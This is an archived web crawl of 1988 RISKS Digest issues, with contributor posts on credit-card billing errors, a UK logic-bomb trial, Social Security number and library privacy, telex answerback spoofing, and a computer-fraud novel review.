mcvax!zen.co.uk!frank@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 11 Jan 88 14:25:31 GMT
</i><PRE>

After my submission the other week about American Express losing my PIN,
I just thought you might like to know that things don't appear to have
ended there.  I used the card to withdraw some cash shortly afterwards
while on holiday in Scotland, and have received two (so far) notifications of
intent to debit the requisite amount from my bank account.

I called Customer Service and spoke to a Representative who assured me
that I would only be debited once; we'll see.  A few questions revealed
that: this duplication had been happening to many Cardmembers using the
Express Cash service; that he didn't think there was a link to those who
had recently lost their PINs (although it hadn't occured to him); and
that he seemed unsure about whether this would be the last problem I
would encounter.

I'm sure all this malarkey is doing Amex's reputation no end of bad;
I'll let you know of any future developments.

Frank Wales, Development Engineer,    [frank@zen.uucp&lt;-&gt;mcvax!zen.co.uk!frank]
Zengrange Ltd., Greenfield Rd., Leeds, ENGLAND, LS9 8DB. (+44) 532 489048 x220 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: PCs die of New Year Cerebration [Risks 6.5]
</A>
</H3>
<address>
Scott Nelson
&lt;<A HREF="mailto:decwrl!esunix!nelson@ucbvax.Berkeley.EDU ">
decwrl!esunix!nelson@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 08:43:05 mst
</i><PRE>

A guy I used to work with here who previously worked at Sperry-Univac (now
UniSys) claimed to have inserted a good joke into one of their intelligent
terminals buried deep in the microcode where no one is likely to accidentally
find it.  I don't know all of the details about the intelligent terminal, but
it could have had PC-compatibility as one of its intelligent features.

Anyway, when the terminal is first powered on, it checks to see if the current
year according to the battery-powered clock is different from the one saved
the last time it was turned off.  If so, it displays a New Year's message and
plays "Auld Lang Syne" for about a minute using the tone generator normally
reserved for the bell.  It is then supposed to work normally for the rest of
the year.  He said he gets a good laugh every new year just thinking about it.

That company does start with "S" as the first article mentioned (at least it
did when it sold the terminal).  I suppose there is a chance that this
"harmless prank" could become not so harmless after a few years.

Oh, and by the way, this guy now works for the other "S" company
mentioned above.  Just a thought...

    Scott R. Nelson
    Evans &amp; Sutherland Computer Corporation

UUCP Address:  {decvax,ucbvax,ihnp4,allegra}!decwrl!esunix!nelson
Alternates:    ihnp4!utah-cs!esunix!nelson     usna!esunix!nelson

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
   UK Logic Bomb Case is Thrown Out
</A>
</H3>
<address>
"Geoff. Lane. Phone UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Tue, 12 Jan 88 11:34:11 GMT
</i><PRE>

The following appeared in Datalink, dated Monday, January 11,1988.

  James McMahon, the contract systems programmer accused of planting
  "logic bombs" in his client's computer systems, has been cleared of
  all charges.

  McMahon walked free from Isleworth Crown Court, London, late last
  month after the presiding judge Derek Holden accepted a
  mid-trial motion that the evidence against McMahon was inconsistent,
  incomplete and laking in reliability.

  The ruling, which focused on print-out and disk exhibits, promises to
  be a watershed in the history of computer law, influencing the
  validity of such admissions in future cases.

  The trial was billed as the UK's first "logic bomb" case, with McMahon
  accused of planting unauthorised code in the DEC PDP 11 system
  software of air freight forwarder Pandair Freight. The prosection
  claimed that one such "lofic bomb" locked terminals at Pandair's
  Heston office, near Heathrow, and a second was set to wipe the memory
  of the company's Birmingham computer.

  McMahon's motive was either financial gain or revenge after losing a
  50,000 pound contract with Pandair, the prosecution said.

  The judge ruled that the evidence wasn't solid enough and instructed
  the jury to pronounce McMahon not quilty. A relieved McMahon told
  Datalink: "I have lost much more than Pandair ever did."

  McMahon, who was referred to during the case as a Posche or
  Lamborghini driving philanderer, says he bears no resentment. His only
  gripe is that he lost a major contract worth 40,000 pounds with the
  Stock Exchange after police informed directors there that there was a
  case pending.

  McMahon has now returened full-time to DEC system consultancy in the
  City.

In a second article in the same paper the following appeared...

  Eighteen months of bing labelled a "logic bomber" finally ended for
  system programmer James McMahon late last month.

  McMahon was found not quilty of planting three so-called logic bombs
  in the screen handling module of his client's DEC PDP 11 system
  software.

  The client, air freight forwarder Pandair, employed him on a freelance
  basic to patch its system software and install or tune its operating
  system, in this case the RSX 11 M+ operating system.

  As well as maintaining his innocence throughout, McMahon is adamant
  that the code that constituted the alleged bombs could never have
  produced the effect the prosecution claimed. In short he claims he was
  framed, that the code was written to discredit him.

  As his barrister, Colin Nicholls, QC, put it in court: "The
  prosecution evidence is partial, deceptive and manufactured. It smells
  of dishonesty and contrivance."

  The judge thought this submission well-founded, agreeing that there
  were areas of unsatisfactory and missing evidence.

  First, the original disks containing the supposed bomb were not taken
  into police custody immediately after the suspected sabotage, but left
  in the Pandair computer room.

  The Pandair programmer who produced the printout of file directories
  and source listings from the disks had sufficient skills in Macro
  Assembler to insert the bombs the judge said.

  Further the Pandair development disk went missing shortly after the
  alleged crime.

  "There is doubt over who produced the printout and which disks it came
  from," he said.

  And the motive for framing McMahon was there, claimed Nicholls:
  jealousy over a shared lover and envy over McMahon's expensive
  lifestyle.

  However, after five weeks the judge was unwilling for the case to
  continue with such gaps and doubts over the evidence. "we need to take
  a particularly robust view of evidence in such a complex technical
  case," he said.

  The relief on the faces of the 12 men and women of the jury as they
  were dismissed testified to that.

 Geoff Lane, UMRCC

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 SSN abuse warned about long ago
</A>
</H3>
<address>
Richard Brown 
&lt;<A HREF="mailto:richard%a.cs.okstate.edu@RELAY.CS.NET">
richard%a.cs.okstate.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Sat, 9 Jan 88 23:06:24 CST
</i><PRE>

  The abuse of the SSN was forseen long ago by none other than then-FBI-
director J. Edgar Hoover.  His warning was against two things that would
reduce U.S.A. to a Police State: a national identification card, and a
national police force.  His warning was heard loudly enough that for many
years the SSN card that you recieved from the government had a notice on the
back "this card is not legal for identification purposes."
  I recently tried an experiment: I tried to go for one month without giving
my SSN to anyone.  I found it impossible to manitain a reasonably civilized
life-style under that circumstance.  For example:  I could not write a 
check, because it has my driver's license number on it which is, guess what?
I could not get a post-office box: positive ID (driver's license or state ID
issued by Department of Motor Vehicles, using SSN) AND current AND former
street address required.  I could not use a credit card (BTW- this is alledged
to be tracked by NCIC and IRS.  Cannot verify how much access is required
for the NCIC version of this).  Could not enroll in college.  |Financial Aid?-
HAH!!!!  Could not get utilities connected at my new appartment.  etc.
It is getting scary, Folks.  Big Brother is here!  
ps My Sysop commented on how much time I've been spending in net.mail lately...
  --- Richard Brown, Oklahoma State University   richard@a.cs.okstate.edu
 
</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
SSN Required Disclosures -- library social security privacy
</A>
</H3>
<address>
Steve Cisler
&lt;<A HREF="mailto:well!sac@lll-crg.llnl.gov ">
well!sac@lll-crg.llnl.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 7 Jan 88 14:00:43 GMT

I work in a public library, and I can assure comp.risks readers that most
libraries and librarians are very conscious of the privacy issue when it
comes to records about library users.

The best example is how our automated circulation systems are designed to
work.  We will be using CLSI, Inc., the largest vendor to libraries, and I
think they are a good example of the care taken to protect the rights of a
book borrower's privacy.  When you check out a book a link is established
between the barcode number on your library card and the barcode in the
borrowed item.  As soon as you bring the book back, that link is broken and
no record of the transaction is archived.  You can opt not to even be able
to see the current unbroken links unless items are overdue.

This means that no one in the library or legal or mental health system can
get a profile of your reading habits from checking old records.  There are
just not any--except overdue items, and they are kept until you pay up and
clear your record.

That is reassuring, but I am troubled that some libraries ask for SSN as a
unique id before they issue a library card.  Our committee on registering
library users quickly decided against this, again because of privacy matters.
I would urge any of you who use a library to inquire about this and post some
responses here.  Our unique id will be first letter of first name, first four
letters of last name, month (1-9,O,N,D) and two digits of the year.  Mine
would be SCISL042. There is some way they handle all the John Smith in one
big area, but this works quite well for most cities and counties.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.07.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.09.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-45</DOCNO>
<DOCOLDNO>IA012-000130-B023-313</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.9.html 128.240.150.127 19970217015130 text/html 22291
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:49:59 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 9</TITLE>
<LINK REL="Prev" HREF="/Risks/6.08.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.10.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.08.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.10.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 9</H1>
<H2> Thursday, 14 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
"The Consultant" by John McNeil  
</A>
<DD>
<A HREF="#subj1.1">
Jim Horning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Missent Missives 
</A>
<DD>
<A HREF="#subj2.1">
Ge' Weijers
</A><br>
<A HREF="#subj2.2">
 Steve Caine
</A><br>
<A HREF="#subj2.3">
 Brent Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj3.1">
Sam Cramer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  SSN / Phone Number / etc. 
</A>
<DD>
<A HREF="#subj4.1">
Andrew Burt
</A><br>
<A HREF="#subj4.2">
 Bruce O'Neel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Library book borrowing privacy 
</A>
<DD>
<A HREF="#subj5.1">
Geoff Goodfellow
</A><br>
<A HREF="#subj5.2">
 Will Martin
</A><br>
<A HREF="#subj5.3">
 Steve Cisler
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  SSNs 
</A>
<DD>
<A HREF="#subj6.1">
Ian G Batten
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"The Consultant" by John McNeil (c) 1978 -- Book Review
</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.dec.com ">
horning@src.dec.com 
</A>&gt;
</address>
<i>
13 Jan 1988 1714-PST (Wednesday)
</i><PRE>

"The Consultant" by John McNeil (c) 1978 
First published in Great Britain in 1978 by Weidenfeld &amp; Nicolson Limited
1983 edition published by Century Publishing Co. Ltd.
        76 Old Compton Street, London W1V 5PA
ISBN 0 7126 0174 0

This is a novel relevant to the concerns of RISKS that I don't think
has been discussed here before.  (On its own, it's quite a competent
crime thriller, the best computer crime fiction I've read--a real
late-night page-turner.)

The central theme of "The Consultant" is computer fraud.  The protagonist
is a computer consultant who specializes in discovering embezzlement
and fraud.  His clients know that he is good at finding it.  What
they don't know is that after he exposes a culprit he quietly takes
over the security loophole for his own use.

Since most of the characters in the book are not computer sophisticates,
most of the explanations are given in simple terms, but McNeil does
not talk down to the reader, and does not spout technical nonsense.
He manages, in quite a readable way, to present many of the basic
precautions against computer fraud, and explain both why they are
necessary and why they are not sufficient.

Anyone familiar with the state of the art ten years ago should spot
some reasons why the precise fiddle described in the book would not
have succeeded.  (Perhaps some details were changed to protect the
guilty?)  But any hotshot programmer reading the book will probably
come up with a scheme that he believes WOULD have worked; I fear that
some of them will be correct about this.

RISKS readers will realize that the situation has gotten worse in
the last decade.  There is vastly more (and more valuable) information
in computer systems.  The systems themselves have gotten more complex,
making "weevils," as well as bugs, harder to locate and remove.  Computer
networks have information and code sloshing around in ways that are
much harder to audit.  It is steadily easier to turn bits into cash.
And the technology of security for information systems doesn't seem
to be keeping up.

This is a good book to give your manager or vice-president when you
want to dampen unwarranted optimism about the safety of data in an
existing or planned information system.  He will almost certainly
come away convinced that it is unwise to trust the system without
repeated security audits--and that it is foolhardy to trust your
auditors!

On the other hand, if you want to INDUCE unwarranted optimism, you
may be pleased to know that this book doesn't seem to have a very
wide circulation in the US.  Brian Randell had told me about it some
time ago, but I was unable to find it in any local bookstores.  I
am grateful to him for mailing me a copy from England.

The cover says that this is "The novel on which the 4-part BBC TV Series was
based," and states that Hywel Bennet played Christopher Webb in "the BBCtv
production of THE CONSULTANT, produced by Ron Craddock, directed by Cyril
Coke and adapted by Alan Plater."  Does anyone know if this series played on
public TV in the US?  I don't recall hearing about it.
                                                              Jim H.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Fraud failed due to computer failure.
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 13 Jan 88 03:00:55 +0100

Three men, one of them an employee of the bank, tried to steal 15.1 million
dollar from an Amsterdam bank. The employee booked at the 24th of December
$8M4 &amp; $6M7 to a swiss Bank account in Zuerich opened by the other two
persons. Normally such a transaction requires two passwords from two
persons.  Somehow the employee managed to get the password of somebody else.
Due to a technical failure the second transaction didn't work and warnings
popped up on other peoples' screens that a transaction failed.  These people
alarmed their bosses, since the transaction was nowhere scheduled.  Also the
police and the Swiss bank were warned, which disabled the accounts.  The
three men tried the same day to collect $5M. When they heard the account
was disabled, they fled. Their identity was known by that time.  They turned
themself in the 4th of January.

(Condensed and translated from `de Volkskrant' 12 Jan '88, of course
without permission.)

</PRE>
<HR><H3><A NAME="subj2.2">
Re:  Missent Missives
</A>
</H3>
<address>
Ge' Weijers
&lt;<A HREF="mailto:mcvax!hobbit!ge@uunet.UU.NET ">
mcvax!hobbit!ge@uunet.UU.NET 
</A>&gt;
</address>
<i>
14 Jan 88 11:08:47 GMT
</i><PRE>
Organization: University of Nijmegen, The Netherlands

&gt;    [It used to be a relatively easy matter to break off a few tynes on
&gt;    your answer-back drum, or indeed install a different one, thus being
&gt;    able to masquerade as someone else.  Perhaps it is harder now?  
&gt;    Somehow I doubt it.  PGN]

It's getting easier all the time. In the days of mechanical teletypes tampering
with the answerback drum could be detected, but now most teletypes have the
answerback message stored in ROM. A hacker/criminal can easily change this
message, and pose as somebody else.  (The answerback drum is also used for the
HERE-IS message, a voluntary identification.)  The current trend of using PC's
as intelligent telex terminals makes this tampering even easier. The answerback
function really should be implemented by the switching system, not by the user
terminal.

Ge' Weijers, Informatics dept., Nijmegen University, the Netherlands
UUCP: {uunet!,}mcvax!kunivv1!hobbit!ge

</PRE>
<HR><H3><A NAME="subj2.3">
Telex Answerback Spoofing
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 14 Jan 88 08:36:27 -0800
From: Steve Caine &lt;shc@cfg.com&gt;

Spoofing a telex answerback is even easier than in the days of the KSR 33 and
its answerback drum.

Our telex "machine" is just a port and a couple of programs on our VAX.
To send a telex, we call our IRC (International Record Carrier) who
transmits a WRU (^E).  If we respond with our answerback, that's it.  We
can enter the number we want, the connection is made, and we have a 2-way,
real-time conversation.  In practice, of course, we just send our message
but we prefix &amp; suffix it with a WRU so we can be "sure" we have reached
the correct number.

When someone calls our telex number, the IRC switcher dials the telephone
number they have on file for us, our machine answers and responds to the IRC's
WRU with our answerback.  If it matches what the IRC expects, their switcher
make the connection between us &amp; the caller.  Our program just collects up the
message &amp; then mails it to a couple of standard mailboxes on our system.

Note that it is trivial to spoof the answerback.  In our program, it is just a
file (/usr/spool/telex/ANSWERBACK).  Also, the answerback is in no sense a
password.  It's at the bottom of every sheet of our letterhead, for example,
and it appears in all the published telex directories.

In most of the world, a printed telex message with an exchange of answerbacks
at the start and the end is a legal proof that the message was sent AND
received.

Steve          (shc@cfg.com     //     ...!{uunet,ihnp4}!cfg!shc)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
More Touch-Tone and lack-of-answerback problems
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 14 Jan 88 13:25:15 PST
From: Brent Chapman &lt;chapman%mica.Berkeley.EDU@violet.berkeley.edu&gt;

The recent, unrelated articles in Risks about (mis)use of Touch-Tone
technology and lack of recognizeable answerback (the Jesse Jackson Telex
to the Washington Post) brought to mind a similar problem that I face
several times each week. 

I run the computer facilities of Capital Market Technology, a finance company
in Berkeley.  We deal in foreign exchange risk management, so our operation has
some around-the-clock aspects to it (although most of our work is done during
normal West Coast business hours).  Part of my job is being on-call at all
times to deal quickly with system problems; I carry a pager with a 10-digit LCD
on the top.  To reach me, someone dials the phone number assigned to my pager,
then punches in the numeric message (usually a phone number or a code) that
they want to appear on my pager LCD.

The problem is, the pager controller answers with a simple series of beeps,
prompting the caller to enter the message.  The caller gets no indication of
_whose_ pager they've reached.  In the six months I've had the pager, my
company has used it exactly once, yet it goes off several times each week
(often in the middle of the night)!), apparently because of people dialing the
wrong number, Sometimes, I'll get several calls per day for a few days in a
row; I'm convinced that people are programming the wrong number (mine!) into
their phone memories, and keep dialing that and wonder why the person they
_think_ they are paging isn't answering calling back.

If everyone just punched in their phone number as the "message", it might not
be so bad.  Life isn't so simple, however.  First, even those that _do_ enter
their phone number as the message usually don't bother to enter their area
code; the service area of our paging company covers all or part of 4 different
Bay Area area codes (415, 408, 916, and 704), plus the Phoenix/Tucson and Los
Angeles/San Diego areas.  Second, people (including my company) often use
private codes.  Third, the paging company also provides non-message (beep-only)
pagers; if someone calls my pager number, but doesn't enter a message, my pager
still goes off (displaying a special "no message" code).

I've gotten to the point that if it goes and the message isn't in our company
code, or if it isn't a phone number that I recognize, I ignore it.  Sometimes,
if it goes off a series of times in the middle of the night, I'm forced to turn
it off just so that I can get some sleep, and risk missing a "real" call from
my company (although they can still call my home number).

It seems to me that a lot of my problems with the system would disappear if the
controller answered with a recorded or syntheszed message ("Please enter your
message for Brent Chapman of Capital Market Technology at the tone.") rather
than the series of beeps it uses now.

Brent Chapman					Capital Market Technology, Inc.
Senior Programmer/Analyst			1995 University Ave., Suite 390
{lll-tis,ucbvax!cogsci}!capmkt!brent		Berkeley, CA  94704
capmkt!brent@{lll-tis.arpa,cogsci.berkeley.edu} Phone: 415/540-6400

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: PCs die of New Year Cerebration [Risks 6.5]
</A>
</H3>
<address>
Sam Cramer
&lt;<A HREF="mailto:cramer@sun.com ">
cramer@sun.com 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 14 Jan 88 20:39:19 GMT
Organization: Sun Microsystems, Mountain View

Re: Suns lose track of time after New Years

The Sun problem involved the clock chip being improperly accessed,
and time drifting as a result.  As I understand it, this is really
a double bug, because improper input makes the clock chip go 
bonkers.  Thus, a bug in software tickles a bug in hardware.

Re: viruses and buried jokes

During college I worked at Sun Electric, which makes automated testers
for cars.  A friend wrote the firmware for an emissions tester that would
printed time-stamped reports.  For some reason, on power-up the date was 
initialized to his birthday.

I understand that video game programmmers often insert "signatures" into
their games.

Sam Cramer	{cbosgd,decwrl,hplabs,seismo,ucbvax}!sun!cramer  cramer@sun.com

                                                            [Sun of agon.  PGN]

</PRE>
<HR><H3><A NAME="subj4.2">
SSN / Phone Number / etc. (Re: RISKS-6.1)
</A>
</H3>
<address>
Andrew Burt
&lt;<A HREF="mailto:isis!aburt@husc6.harvard.edu ">
isis!aburt@husc6.harvard.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 6 Jan 88 06:04:06 GMT
Organization: Math/CS, University of Denver

Re: Jordan Hayes &lt;jordan@ads.arpa&gt; on credit purchases:

And if someone just decides to call you up and ask, "Hi, this is Tom,
I'm the manager at &lt;popular local store that takes VISA/MC&gt; and we can't
read your charge card number on a charge slip you recently made here, could
you please read it to me?" -- you would give it to them?  Sounds like an
easy way to get a lot of valid account numbers.

Someone called me asking this very thing.  I said I would supply it if
they wrote me a letter (on company letterhead of course).  I never received
any letter...  (Maybe they just blew it off -- but I have no desires of facing
the hassle involved in taking off a phony charge.)

And you don't dump your receipts into a drawer?  For shame!

Andrew Burt 				   			isis!aburt

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Re: SSN and state universities.
</A>
</H3>
<address>
Bruce O'Neel 
&lt;<A HREF="mailto:XRBEO%VPFVM.BITNET@CUNYVM.CUNY.EDU">
XRBEO%VPFVM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 06 Jan 88 18:54:08 EST
</i><PRE>

An unnamed state university in MD takes your SSN and adds a digit to it (a 1),
therefore they say it isn't you SSN.  ("SSN's are 9 digits, you student id is
10 digits).  Another unnamed state university in VA is very careful to do the
same thing but call it you student id.  Only if pressed (What is my student id?
 "It's on your student id card"  "But I don't have one of those" ...) do they
say SSN.

</PRE>
<HR><H3><A NAME="subj5.2">
re: required disclosures -- library book borrowing privacy
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
14 Jan 1988 10:40-PST
</i><PRE>
From: the terminal of Geoff Goodfellow &lt;Geoff@csl.sri.com&gt;

Steve Cisler mentions that most libraries and librarians are very conscious
of the privacy issue when it comes to records about library users.  He
explained how their system made and broke links and kept no audit trails of
past links when they were broken upon book return.

But, what about backup's?  Does the library system do monthly, weekly,
daily, hourly (like MIT-Multics used to) or real-time file mirroring of book
borrowing information?  how long are the backup tapes/disks kept before
being recycled?  Stored off site, etc.?

As was discovered (on a hunch) in the National Security Council office
automation system (PROFS), backup's played a key role in the Iran-Contra
investigation of Oliver North &amp; John Poindexter.

</PRE>
<HR><H3><A NAME="subj5.3">
 Re:  SSN Required Disclosures -- library social security privacy
</A>
</H3>
<address>
Will Martin -- AMXAL-RI 
&lt;<A HREF="mailto:wmartin@ALMSA-1.ARPA">
wmartin@ALMSA-1.ARPA
</A>&gt;
</address>
<i>
Wed, 13 Jan 88 9:23:53 CST
</i><PRE>

Interesting comment there; glad you posted it. However, does this mean that
the library then has no way of tracing back the chain of patrons who checked
out a book to find out who might have damaged it, so they can be charged for
this? For example, just a couple weeks ago, I checked out and read a book
from the St. Louis Public Library (which uses a bar-code-scan system now;
they used to take pictures of the library card and the data pasted inside the
book's front cover). I discovered that a page had been torn in half near the
end of the book. Is there no way for the library to query the patron(s) who
had checked out this book before me, to see if any of them would own up to
damaging it?
                                                           Will Martin
wmartin@ALMSA-1.ARPA   (on USENET try "...!uunet!almsa-1.arpa!wmartin")

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re:  SSN Required Disclosures -- library social security privacy
</A>
</H3>
<address>
Steve Cisler
&lt;<A HREF="mailto:well!sac@cogsci.berkeley.edu ">
well!sac@cogsci.berkeley.edu 
</A>&gt;
</address>
<i>
Thu, 14 Jan 88 12:53:52 PST
</i><PRE>
Cc: risks@csl.sri.com

No, there is no way to query patrons who may have borrowed a book before you
did.  We take the stance that it is better to lose some control and protect
privacy.  In some cases we catch the damage before shelving the book and
note that in the front cover "Damage noted 1/14/88" etc.  Steve

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     SSNs (RISKS-6.8)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date:         Thu, 14 Jan 88 12:49:14 GMT
From:         Ian G Batten &lt;BattenIG@CS.BHAM.AC.UK&gt;
Organisation: University of Birmingham Computer Science Department

The discussion of the pros and cons of having to reveal your SSN in the USA
is rather interesting.  The UK has virtually no national register of people
(officially).  You legally have to register births, deaths and marriages and
in principle you have to be on the electoral roll (although the take-up rate
of this is reputed to be less than 70 percent in some inner-city areas).
There is no national identification number or card (not even drivers
licenses.  When I was in California someone told me there were non-driving
driving permits for the blind to act as ID).

This all seems similar to the USA.  Yet I rarely have to produce my social
security number (for supplementary benefit, to request a tax code and for my
employer to pay my NI contributions).  Libraries want a proof of ID, but
anything will do.  Each body uses a distinct magic number for people --- I
have a Social Security Number, an NHS number, a Tax Reference, a Driver Number.

I wonder why the USA has got its systems hung up on one ID number.  Here
SSNs are used solely for Social Security, Driver Numbers for driving etc.  I
have never yet seen a form related to anything other than a number's own
domain requesting one.  Do Americans need to quote an SSN for a passport?  A
credit card?  A mortgage?  Why is a country with so many liberal tendencies
allowing itself to make the job of repressive law-making easier?
                                                                     ian

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.08.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.10.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-46</DOCNO>
<DOCOLDNO>IA012-000130-B023-333</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.10.html 128.240.150.127 19970217015143 text/html 13838
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:50:11 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 10</TITLE>
<LINK REL="Prev" HREF="/Risks/6.09.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.11.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.09.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.11.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
